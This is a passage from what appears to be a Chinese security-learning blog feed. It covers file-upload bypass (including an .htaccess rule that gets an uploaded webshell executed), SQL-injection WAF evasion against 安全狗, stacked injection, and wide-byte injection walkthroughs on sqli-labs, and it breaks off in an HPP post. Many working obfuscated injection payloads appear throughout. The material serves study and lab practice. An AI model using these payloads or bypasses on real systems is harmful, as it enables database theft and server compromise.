</p><p>1、后缀名：</p><p>（1）黑名单（不允许上传的格式后缀）：asp，php，jsp，aspx，war</p><p>​          黑名单缺陷：若限制后缀名不全，可以使用其他后缀名进行绕过，例如：php5，Phtml等</p><p>（2）白名单（可允许上传的格式后缀）：jpg，png，zip，rar，gif，…</p><p>2、文件类型：MIME 信息，通过类型猜测后缀名，可通过BP抓包伪造</p><p>3、文件头：内容头信息</p><h2 id="文件上传漏洞绕过方法"><a href="#文件上传漏洞绕过方法" class="headerlink" title="文件上传漏洞绕过方法"></a>文件上传漏洞绕过方法</h2><p>利用burp抓包改后缀名进行绕过；</p><p>利用00截断上传webshell；</p><p>构造图片马绕过；</p><p>绕过服务器扩展名检测上传；</p><p>竞争条件上传绕过。</p><p>##.htaccess文件上传漏洞原理</p><p><strong>什么是.htaccess</strong>：</p><p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置，通过.htaccess文件可以实现网页301重定向、自定义404页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p><strong>需要的代码如下：</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;FilesMatch &quot;cimer&quot;&gt;Sethandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch &gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>原理：</strong></p><p>若当前目录存在<code>.htaccess</code>后缀名的文件，目录中存在<strong>文件名</strong>中含有<code>cimer</code>，就把<code>application/x-httpd-php</code>当成<code>MIME</code>去执行，此<code>MIME</code>为<code>php</code>格式，此时这个文件就会被当作php文件执行。这时可用菜刀或蚁剑进行连接。</p><p><strong>实战意义：</strong></p><p>1、如果存在可以上传 .htaccess 文件，就可以直接利用此规则解析；</p><p>2、如果存在修改文件权限，就直接修改解析规则；</p>]]></content>
      
      
      <categories>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入-绕过WAF</title>
      <link href="/2022/02/11/SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87WAF/"/>
      <url>/2022/02/11/SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87WAF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于网站会部署WAF，例如安全狗，宝塔等，各自有各自的WAF策略规则，因此，绕过的方法也不同。了解其最基本的WAF规则便可进行对其绕过。</p><p><img src="/2022/02/11/SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87WAF/image-20220212223455557.png" alt="image-20220212223455557"></p><h2 id="WAF绕过姿势"><a href="#WAF绕过姿势" class="headerlink" title="WAF绕过姿势"></a>WAF绕过姿势</h2><p>1、大小写&#x2F;关键字的替换：</p><p>i<code>d=1 UnIoN/**/SeLeCT 1,user()</code></p><p><code>Hex() bin() 等价于 ascii()</code> </p><p><code>Sleep() 等价于 benchmark()</code> </p><p><code>Mid()substring() 等价于 substr()</code> </p><p><code>@@user 等价于 User()</code> </p><p><code>@@Version 等价于 version()</code></p><p>2、各种编码：</p><p>url，utf-8，utf-16，utf-32，hex等</p><p>3、双写绕过：</p><p>ununionion，selselectect，oorr，aandnandd等</p><p>4、HTTP参数污染（HPP）：</p><p>?id&#x3D;1&amp;id&#x3D;2&amp;id&#x3D;3</p><p>5、编码的加密与解密：<br>hex，unlcode，base64等</p><p>6、更改请求方式：</p><p>GET，POST，COOKIE或数据包里的各种关键字等</p><p>7、内联注释：</p><p><code>/*!UnIon12345SelEcT*/ 1,user()</code> </p><p><strong>8、FUZZ大法</strong></p><p>9、<code>%20/*!44509union*/%23x%0aselect%201,2,3</code>只基于Mysql数据库的<strong>版本号绕过</strong></p><h2 id="逻辑层的绕过"><a href="#逻辑层的绕过" class="headerlink" title="逻辑层的绕过"></a>逻辑层的绕过</h2><p>1、逻辑问题</p><p>（1）云 waf 防护，一般我们会尝试通过查找站点的真实 IP，从而绕过 CDN 防护。 </p><p>（2）当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输</p><p>​          入,可尝试Bypass。 </p><p>（3）HTTP 和 HTTPS 同时开放服务，没有做 HTTP 到 HTTPS 的强制跳转，导致HTTPS     有 WAF 防护，HTTP 没有防护，直接访问 HTTP 站点绕过防护。 </p><p>（4）特殊符号<code>%00</code>，部分 waf 遇到<code>%00</code> 截断，只能获取到前面的参数，无法获取到后面的有害参数 输 入 ， 从 而 导 致 Bypass 。 比 如 ： <code>id=1%00and 1=2 union select 1,2,column_name from information_schema.columns</code></p><p>2、性能问题</p><p><strong>猜想 1</strong>：在设计 WAF 系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只 要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。</p><p>例：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">Select</span> <span class="token number">0xA</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">UnIoN</span><span class="token operator">+</span><span class="token keyword">SeLeCT</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> PS：0xA*1000 指 0xA 后面”A”重复 1000 次，一般来说对应用软件构成缓冲区溢出都需要较大的测试 长度，这里 1000 只做参考也许在有些情况下可能不需要这么长也能溢出。</p><p><strong>猜想 2</strong>：不少 WAF 是 C 语言写的，而 C 语言自身没有缓冲区保护机制，因此如果 WAF 在处理测试向 量时超出了其缓冲区长度就会引发 bug，从而实现绕过。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?a0<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>a1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&amp;</span>a100<span class="token operator">=</span><span class="token number">100</span><span class="token operator">&amp;</span>id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>schema_name<span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span>INFORMATION_SCHEMA<span class="token punctuation">.</span>schemata<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>备注：获取请求参数，只获取前 100 个参数，第 101 个参数并没有获取到，导致 SQL 注入绕过。</p><p>3、白名单</p><p>方式一：IP 白名单 从网络层获取的 ip，这种一般伪造不来，如果是获取客户端的 IP，这样就可能存在伪造 IP 绕过的情 况。 </p><p>测试方法：修改 http 的 header 来 bypass waf </p><p>X-forwarded-for </p><p>X-remote-IP </p><p>X-originating-IP </p><p>X-remote-addr </p><p>X-Real-ip</p><p>方式二：静态资源 </p><p>特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css 等等)，类似白名单机制，waf 为了检测效率，不去检测这样一些静态文件名后缀的请求。</p><p> <a href="http://x.x.x.x/sql.php/?id=1">http://x.x.x.x/sql.php/?id=1</a></p><p> <a href="http://x.x.x.x/sql.php/1.js?id=1">http://x.x.x.x/sql.php/1.js?id=1</a> </p><p>备注：Aspx&#x2F;php 只识别到前面的.aspx&#x2F;.php 后面基本不识别</p><p>方式三：url 白名单 为了防止误拦，部分 waf 内置默认的白名单列表，如 admin&#x2F;manager&#x2F;system 等管理后台。只要 url 中存在白名单的字符串，就作为白名单不进行检测。</p><p>方式四：爬虫白名单</p><p>部分WAF有提供爬虫白名单的功能，识别爬虫的技术一般有两种：<br>1、根据UserAgent                      2、通过行为来判断</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>对于安全狗来说，它在进行防护的时候会对关键字进行拦截，比如<code>union select</code>字段，它会把<code>union select</code>字段当成一个整体进行拦截，若对其从中间加干扰字符可进行对其绕过，对于<code>database()</code>字段，同样也是整体拦截，将<code>database</code>与<code>()</code>进行字符干扰等方法可将其绕过。</p><p>其实最关键的是了解其拦截的方式，对其进行分析（抓包），针对其拦截的方式去写脚本进行注入（<strong>FUZZ大法</strong>）</p><h2 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h2><p>以网站安全狗为例：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到当进行联合注入的时候WAF对攻击进行了拦截</p><p><img src="/2022/02/11/SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87WAF/image-20220213140044011.png" alt="image-20220213140044011"></p><p><img src="/2022/02/11/SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87WAF/image-20220213140143847.png" alt="image-20220213140143847"></p><p>而当只进行<code>union</code>或<code>select</code>单个字段进行查询时网站会报正常：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;-1 union&#x2F;select  1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/11/SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87WAF/image-20220213140253672.png" alt="image-20220213140253672"></p><p>说明安全狗只对<code>union select</code>两个字段在一起查询时才会拦截，这时只要将这两个字段进行干扰，使安全狗检测的时候认为它们不在一起便可进行成功注入。</p><p><strong>拦截order by</strong></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;2&#39; order&#x2F;*&#x2F;*&#x2F;by 3%23http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order&#x2F;*&#x2F;&#x2F;------&#x2F;*&#x2F;by 3%23http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;3&#39; order&#x2F;*&#x2F;&#x2F;------&#x2F;*&#x2F;%23%0aby 3%23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>拦截union select</strong></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23%23-----------A&#x2F;*&#x2F;select 1,2,3 %23http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23%23--&#x2F;%23%23*&#x2F;select 1,2,3 %23http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23%23--+&#x2F;%23%23*&#x2F;select 1,2,3 %23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>**拦截database()<strong>【</strong>也适用于拦截user()**】</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23--%23*&#x2F;select 1,2,database&#x2F;*&#x2F;--+A*&#x2F;() %23http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23--%23*&#x2F;select 1,2,database&#x2F;*&#x2F;*!&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;A*&#x2F;() %23http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23--%23*&#x2F;select 1,3,database&#x2F;*&#x2F;*!&lt;&gt;&lt;&gt;A*&#x2F;() %23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>拦截from</strong>（<code>%0a</code>：换行符）</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23--%23*&#x2F;select 1,3,group_concat(table_name)  &#x2F;*!%23%0afrom*&#x2F; information_schema.tables where table_schema&#x3D;&#39;security&#39;%23http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23--%23*&#x2F;select 1,3,group_concat(table_name) &#x2F;*!%0afrom*&#x2F; information_schema.tables where table_schema&#x3D;&#39;security&#39;%23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>这里最重要的还是原理，使用Fuzz大法成功几率会大大增加，改天试试Fuzz大法</strong></p><p>附一篇博主的过狗文章：（主要学习思路和方法）<br>原文链接：<a href="https://blog.csdn.net/weixin_43623271/article/details/122814962">https://blog.csdn.net/weixin_43623271/article/details/122814962</a></p><h2 id="00截断原理"><a href="#00截断原理" class="headerlink" title="00截断原理"></a>00截断原理</h2><p>这里说明一下00截断原理：</p><p>0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束。这个可以用在对文件类型名的绕过上。</p><p>但要注意是文件的16进制内容里的00，而不是文件名中的00 ！！！就是说系统是按16进制读取文件（或者说二进制），</p><p>遇到ascii码为零的位置就停止，而这个ascii码为零的位置在16进制中是00，用0x开头表示16进制，也就是所说的0x00截断。</p><p><strong>%00是被服务器解码为0x00发挥了截断作用。</strong></p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> Bypass WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入-堆叠注入</title>
      <link href="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h2><p>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是 任意的语句。</p><p>如图：<br><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20220210171014222.png" alt="image-20220210171014222"></p><h2 id="场景举例"><a href="#场景举例" class="headerlink" title="场景举例"></a>场景举例</h2><p>堆叠注入场景之一：</p><p>在获取管理员的后台和密码后，由于密码加密无法破解，可以使用对的注入进行插入新的管理员账号密码管理后台获取数据。</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入-宽字节注入</title>
      <link href="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h2><p><strong>原理</strong>：<strong>mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。</strong>我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \’ 。 </p><h2 id="注入思路"><a href="#注入思路" class="headerlink" title="注入思路"></a>注入思路</h2><p><strong>思路一</strong>：由于单引号被过滤了，所以我们使用%df吃掉 \， 具体的原因是urlencode(&#39;) &#x3D; %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。</p><p><strong>思路二</strong>：将 &#39; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。</p><hr><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>这里以Less-32–Less-37为例。</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p><strong>Less-32</strong></p><p>源码中将<code>&#39;</code>，<code>&quot;</code>和<code>\</code>进行了过滤&#96;。</p><p>将 <code>&#39;</code> 转为<code>\&#39;</code>， 将 <code>\</code> 转为<code>\\</code>，将 <code>&quot;</code>转为 <code>\&quot;</code>，将<code>\&#39;</code>转为<code>\\\&#39;</code>。</p><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210155309048.png" alt="image-20220210155309048"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-32&#x2F;?id&#x3D;1\&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到<code>\&#39;</code>过滤掉了。</p><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210155816313.png" alt="image-20220210155816313"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-32&#x2F;?id&#x3D;1%df&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当使用<code>%df</code>将<code>\</code>吃掉后成功注入。</p><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210160354619.png" alt="image-20220210160354619"></p><p>判断字段数：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-32&#x2F;?id&#x3D;1%df&#39; order by 4 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210160633736.png" alt="image-20220210160633736"></p><p>判断回显点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-32&#x2F;?id&#x3D;-1%df&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210160746728.png" alt="image-20220210160746728"></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p><strong>Less-33</strong></p><p>源码中使用了<code>addslashes()</code> 函数；</p><p>addslashes()：返回在预定义字符之前添加反斜杠的字符串。</p><p>预定义字符是： 单引号<code>（&#39;）</code> 双引号<code>（&quot;）</code> 反斜杠<code>（\）</code></p><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210161857546.png" alt="image-20220210161857546"></p><p>Less-33的payload与Less-32相同。</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p><strong>Less-34</strong></p><p>由于Less-34是POST方式提交信息，而上面几关是GET方式通过url形式提交，数据会通过URLencode；</p><p><strong>POST注入中可以利用</strong>：将 utf-8 转换为 utf-16 或 utf-32，例如将<code>&#39;</code>转为 utf-16 为 <code>�&#39;</code>进行注入。</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;�&#39; or 1&#x3D;1 #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210163426756.png" alt="image-20220210163426756"></p><p>判断字段数：</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;�&#39; order by 3 #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210163753118.png" alt="image-20220210163753118"></p><p>判断回显点：</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;�&#39; union select 1,2 #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210163726016.png" alt="image-20220210163726016"></p><p>原sql语句：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token variable">@$sql</span><span class="token operator">=</span>"<span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">'$uname'</span><span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'$passwd'</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>此时 sql 语句为:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">'�'</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#' and password='$passwd' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p><strong>Less35</strong></p><p>源码中<code>id</code>值没有被处理，忽略<code>addslashes()</code>函数。<br><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210164117234.png" alt="image-20220210164117234"></p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-35&#x2F;?id&#x3D;-1 or 1&#x3D;1http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-35&#x2F;?id&#x3D;1 order by 4http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p><strong>Less-36</strong></p><p>源码中有了<code>mysql_real_escape_string()</code>函数过滤字符串。</p><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210164814258.png" alt="image-20220210164814258"></p><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p><p>下列字符受影响： <code>\x00</code>，  <code>\n</code>，  <code>\r</code>，  <code>\</code>，  <code>&#39;</code>，<code>&quot;</code>， <code>\x1a</code></p><p>判断注入点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-36&#x2F;?id&#x3D;1%df&#39;  or 1&#x3D;1--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里还是使用<code>%df</code>吃掉<code>\</code>。</p><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210165309366.png" alt="image-20220210165309366"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-36&#x2F;?id&#x3D;�&#39;  or 1&#x3D;1--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者这里直接使用<code>�&#39;</code>Bypass。</p><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210165421459.png" alt="image-20220210165421459"></p><p><strong>Notice:</strong> </p><p>在使用 <code>mysql_real_escape_string()</code>时，如何能够安全的防护这种问题，需要将 mysql 设置为 gbk 即可。</p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p><strong>Less-37</strong></p><p>源码当中还是使用了<code>mysql_real_escape_string()</code>函数，原理相同。</p><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210165847294.png" alt="image-20220210165847294"></p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin�&#39; or 1&#x3D;1#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20220210170033498.png" alt="image-20220210170033498"></p><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p> 从上面的几关当中，可以总结一下过滤 ‘ \ 常用的三种方式是直接 <code>replace</code>， <code>addslashes()</code>,<code>mysql_real_escape_string()</code>。三种方式仅仅依靠一个函数是不能完全防御的，所 以我们在编写代码的时候需要考虑的更加仔细。</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入-HPP</title>
      <link href="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/"/>
      <url>/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><p>##服务器两层架构</p><p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210131503726.png" alt="image-20220210131503726"></p><p>服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。工作流程为：client 访问服务器， 能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。</p><p><strong>大多数服务器对于参数解析的介绍：</strong></p><table><thead><tr><th align="center">Web服务器</th><th align="center"><strong>参数获取函数</strong></th><th align="center"><strong>获取到的参数</strong></th></tr></thead><tbody><tr><td align="center">PHP&#x2F;Apache</td><td align="center">$_GET(“par”)</td><td align="center">Last</td></tr><tr><td align="center">JSP&#x2F;Tmocat</td><td align="center">Request.getParameter(“par”)</td><td align="center">First</td></tr><tr><td align="center">Perl(CGI)&#x2F;Apache</td><td align="center">Param(“par”)</td><td align="center">First</td></tr><tr><td align="center">Python&#x2F;Apache</td><td align="center">getvalue(“par”)</td><td align="center">All(List)</td></tr><tr><td 